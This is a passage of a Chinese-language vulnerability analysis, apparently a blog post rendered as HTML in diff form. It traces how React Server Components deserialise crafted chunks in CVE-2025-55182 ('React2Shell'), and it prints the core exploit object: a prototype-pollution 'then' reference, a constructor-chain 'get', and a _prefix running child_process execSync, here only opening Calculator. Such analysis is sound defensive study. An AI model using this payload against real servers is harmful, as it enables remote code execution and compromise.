+&lt;/h3&gt;&lt;p&gt;请求中的两个字段数据解析完毕后，进入 &lt;code&gt;await _chunks[0]&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;而如下图，Chunk 函数通过原型继承了 Promise 函数，并重写了其原型对象中的 then 方法。所以 &lt;code&gt;await _chunks[0]&lt;/code&gt; 将触发&lt;code&gt;_chunks[0].then()&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/Chunk_prototype.png"
+width="1228"
+height="1118"
+srcset="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/Chunk_prototype_hu_a1f866fcf4cbe839.png 480w, https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/Chunk_prototype_hu_54e625a7081a5fd5.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="109"
+data-flex-basis="263px"
+&gt;&lt;/p&gt;
+&lt;p&gt;如上，因为 &lt;code&gt;_chunks[0]&lt;/code&gt;的 status 属性等于“resolved_model”，所以进入 &lt;code&gt;initializeModelChunk() &lt;/code&gt;函数分支。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;initializeModelChunk()&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/initializeModelChunk_2.png"
+width="1031"
+height="441"
+srcset="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/initializeModelChunk_2_hu_8e9266edc05740e8.png 480w, https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/initializeModelChunk_2_hu_34c4a205879ae3f1.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="233"
+data-flex-basis="561px"
+&gt;&lt;/p&gt;
+&lt;p&gt;声明、赋值几个变量后，&lt;code&gt;_chunks[0]&lt;/code&gt;的 &lt;code&gt;status&lt;/code&gt; 属性修改为“cyclic”，&lt;code&gt;chunk.reason&lt;/code&gt;和&lt;code&gt;chunk.value&lt;/code&gt;都修改为 &lt;code&gt;null&lt;/code&gt;。而后，response、原 &lt;code&gt;chunk.value&lt;/code&gt;进行 JSON 反序列化获得的对象 、&lt;code&gt;chunk.reason&lt;/code&gt;的字符串值传入 &lt;code&gt;reviveModel()&lt;/code&gt;函数。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;reviveModel()_0&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/reviveModel_2.png"
+width="1122"
+height="775"
+srcset="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/reviveModel_2_hu_39f298e5e2d71b45.png 480w, https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/reviveModel_2_hu_6d3833612b14cc7e.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="144"
+data-flex-basis="347px"
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;reviveModel&lt;/code&gt;函数中，&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;如上所述，形参 value 是原&lt;code&gt;chunk.value&lt;/code&gt;进行 JSON 反序列化获得的对象，所以进入第2个 if 分支&lt;/li&gt;
+&lt;li&gt;因为 &lt;code&gt;response._temporaryReferences&lt;/code&gt; 的值原本就是 &lt;code&gt;undefined&lt;/code&gt;，所以没有传入新值&lt;/li&gt;
+&lt;li&gt;因为如上所述，value 是个普通对象不是 Array，进入 else 分支&lt;/li&gt;
+&lt;li&gt;遍历 value 对象的属性，检查属性是否为 value 自身属性后，给 parentObj 重新赋值为“0:then”字符串&lt;/li&gt;
+&lt;li&gt;value 变 parent、value[i] 变 value 后，递归调用&lt;code&gt; reviveModel()&lt;/code&gt;函数&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;reviveModel()_1_1&lt;/strong&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;span class="lnt"&gt;17
+&lt;/span&gt;&lt;span class="lnt"&gt;18
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-javascript" data-lang="javascript"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nx"&gt;reviveModel&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;response&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;parentObj&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;parentKey&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;value&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;reference&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;// 五个参数依次排开
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;span class="nx"&gt;$response&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;then&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;$1:__proto__:then&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;status&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;resolved_model&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;reason&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;value&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;{\&amp;#34;then\&amp;#34;:\&amp;#34;$B\&amp;#34;}&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;_response&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;_prefix&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;process.mainModule.require(&amp;#39;child_process&amp;#39;).execSync(&amp;#39;open -a Calculator&amp;#39;);&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;_formData&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;get&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;$1:constructor:constructor&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;},&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;},&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;&amp;#34;then&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;&amp;#34;$1:__proto__:then&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;&amp;#34;0:then&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;因为 value 是字符串&lt;code&gt;&amp;quot;$1:__proto__:then&amp;quot;&lt;/code&gt;，所以直接进入&lt;code&gt;parseModelString()&lt;/code&gt;函数，并返回其返回值。跟进该函数。&lt;/p&gt;
+&lt;p&gt;运行结果如下图，因为字符“1”没有对应的预置处理方式，经过几个 switch 分支后，value 被去除“$”前缀后一起进入&lt;code&gt;getOutlinedModel()&lt;/code&gt;函数。&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/parseModelString_1_1.png"
+width="999"
+height="223"
+srcset="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/parseModelString_1_1_hu_2fa0a1f4a62656e0.png 480w, https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/parseModelString_1_1_hu_880b545d04f75924.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="447"
+data-flex-basis="1075px"
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;getOutlinedModel()&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/getOutlinedModel.png"
+width="1019"
+height="337"
+srcset="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/getOutlinedModel_hu_bd88ea3e4b83c51b.png 480w, https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/getOutlinedModel_hu_aad3d45f575e2d27.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="302"
+data-flex-basis="725px"
+&gt;&lt;/p&gt;
+&lt;p&gt;value 传入后根据“:”分割为包含三个元素的数组 reference，reference第一个元素转为数值型赋值给局部变量 id，而后传入 &lt;code&gt;getChunk()&lt;/code&gt;函数并把返回值重新复制给 id。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;getChunk()&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/getChunk_3.png"
+width="1013"
+height="483"
+srcset="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/getChunk_3_hu_31b4cd0bb37cb716.png 480w, https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/getChunk_3_hu_c2cc61e27ef3728a.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="209"
+data-flex-basis="503px"
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;getChunk()&lt;/code&gt;函数中，因为这次传入的 id 值为&lt;code&gt;1&lt;/code&gt;，所以也是构造并返回了第二个 Chunk 对象(如下)。同样，这个 Chunk 对象也被放入了 response 对象的_chunks 属性中，对应的 key 值为&lt;code&gt;1&lt;/code&gt;。&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;span class="lnt"&gt;17
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-json" data-lang="json"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;// _chunks[1]
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;status:&lt;/span&gt; &lt;span class="nt"&gt;&amp;#34;resolved_model&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;value:&lt;/span&gt; &lt;span class="nt"&gt;&amp;#34;\&amp;#34;$@abc\&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;reason:&lt;/span&gt; &lt;span class="err"&gt;1,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;_response:&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;_bundlerConfig:&lt;/span&gt; &lt;span class="err"&gt;undefined,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;_prefix:&lt;/span&gt; &lt;span class="nt"&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;_formData:&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="err"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;_chunks:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="err"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;_closed:&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="err"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;_closedReason:&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="err"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;_temporaryReferences:&lt;/span&gt; &lt;span class="err"&gt;undefined,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;},&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="err"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;回到 &lt;code&gt;getOutlinedModel()&lt;/code&gt;，紧接着 又进入&lt;code&gt;initializeModelChunk()&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/getOutlinedModel_5.png"
+width="1003"
+height="311"
+srcset="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/getOutlinedModel_5_hu_411f90c0d020065b.png 480w, https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/getOutlinedModel_5_hu_5adfd379767525da.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="322"
+data-flex-basis="774px"
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;initializeModelChunk()&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/initializeModelChunk_3.png"
+width="947"
+height="471"
+srcset="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/initializeModelChunk_3_hu_d230de5fd0b92c4.png 480w, https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/initializeModelChunk_3_hu_247f407995f8938c.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="201"
+data-flex-basis="482px"
+&gt;&lt;/p&gt;
+&lt;p&gt;同样的，&lt;code&gt;_chunks[1]&lt;/code&gt; 的 &lt;code&gt;status&lt;/code&gt; 属性修改为“cyclic”，&lt;code&gt;chunk.reason&lt;/code&gt;和&lt;code&gt;chunk.value&lt;/code&gt;都修改为 &lt;code&gt;null&lt;/code&gt;。而后，response、原 &lt;code&gt;chunk.value&lt;/code&gt;进行 JSON 反序列化获得的对象（字符串&amp;quot;$@abc&amp;quot;） 、&lt;code&gt;chunk.reason&lt;/code&gt;的字符串值传入 &lt;code&gt;reviveModel()&lt;/code&gt;函数。&lt;/p&gt;
+&lt;p&gt;因为上述 value 是个字符串，所以进入第一个分支——&lt;code&gt;parseModelString()&lt;/code&gt;函数：&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/parseModelString_1_1_1.png"
+width="1023"
+height="233"
+srcset="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/parseModelString_1_1_1_hu_90f8e40229496eb9.png 480w, https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/parseModelString_1_1_1_hu_cd6b8f1998467826.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="439"
+data-flex-basis="1053px"
+&gt;&lt;/p&gt;
+&lt;p&gt;如上，字符串“abc”按照十六进制解析得到数字2748（没什么用，能解析成数字就可以），作为参数 id传入 getChunk 函数，获得以下 Chunk 对象：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-json" data-lang="json"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;// _chunks[2748]
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;status:&lt;/span&gt; &lt;span class="nt"&gt;&amp;#34;pending&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;value:&lt;/span&gt; &lt;span class="err"&gt;null,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;reason:&lt;/span&gt; &lt;span class="err"&gt;null,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;_response:&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;_bundlerConfig:&lt;/span&gt; &lt;span class="err"&gt;undefined,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;_prefix:&lt;/span&gt; &lt;span class="nt"&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;_formData:&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt; &lt;span class="err"&gt;Symbol&lt;/span&gt; &lt;span class="err"&gt;*&lt;/span&gt; &lt;span class="err"&gt;2&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="err"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;_chunks:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="err"&gt;Chunk&lt;/span&gt; &lt;span class="err"&gt;*&lt;/span&gt; &lt;span class="err"&gt;3&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="err"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;_closed:&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="err"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;_closedReason:&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="err"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;_temporaryReferences:&lt;/span&gt; &lt;span class="err"&gt;undefined,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;},&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="err"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;回到 &lt;code&gt;initializeModelChunk()&lt;/code&gt; ,&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/initializeModelChunk_4.png"
+width="995"
+height="511"
+srcset="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/initializeModelChunk_4_hu_69b593a170e26818.png 480w, https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/initializeModelChunk_4_hu_c8a7301183e64d2b.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="194"
+data-flex-basis="467px"
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;_chunks[1]&lt;/code&gt; 的 status 属性被修改为“fulfilled”，value 属性被修改为 &lt;code&gt;_chunks[2748]&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;回到 &lt;code&gt;getOutlinedModel()&lt;/code&gt;，&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/getOutlinedModel_2.png"
+width="1009"
+height="375"
+srcset="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/getOutlinedModel_2_hu_fca6ff5e3c7ff895.png 480w, https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/getOutlinedModel_2_hu_eb57b11ee3ae7fe.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="269"
+data-flex-basis="645px"
+&gt;&lt;/p&gt;
+&lt;p&gt;因为 &lt;code&gt;_chunks[1].status&lt;/code&gt; 等于 “fulfilled”，&lt;code&gt;parentObject&lt;/code&gt; 被临时赋值为 &lt;code&gt;_chunks[2748]&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;第一次循环，取出 reference 第2个元素&lt;code&gt;'__proto__'&lt;/code&gt;作为 key取出 &lt;code&gt;parentObject&lt;/code&gt; 对应属性为&lt;code&gt;parentObject&lt;/code&gt; 重新赋值。&lt;/p&gt;
+&lt;p&gt;第二次循环，取出 reference 第2个元素&lt;code&gt;'then'&lt;/code&gt;作为 key取出 &lt;code&gt;parentObject&lt;/code&gt; 对应属性并为&lt;code&gt;parentObject&lt;/code&gt; 重新赋值。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;_chunks[2748]&lt;/code&gt; 作为 Chunk 实例，其 &lt;code&gt;__proto__&lt;/code&gt;属性及 &lt;code&gt;__proto__.then&lt;/code&gt; 自然是如前文所展示：&lt;a class="link" href="#34-then%e5%9b%9e%e8%b0%83" &gt;Chunk.prototype&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;循环结束，response 与上述 then 函数作为参数传入 &lt;code&gt;createModel()&lt;/code&gt; 函数。&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/createModel.png"
+width="349"
+height="63"
+srcset="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/createModel_hu_ee3602682d047393.png 480w, https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/createModel_hu_d15249b88cd91f1f.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="553"
+data-flex-basis="1329px"
+&gt;&lt;/p&gt;
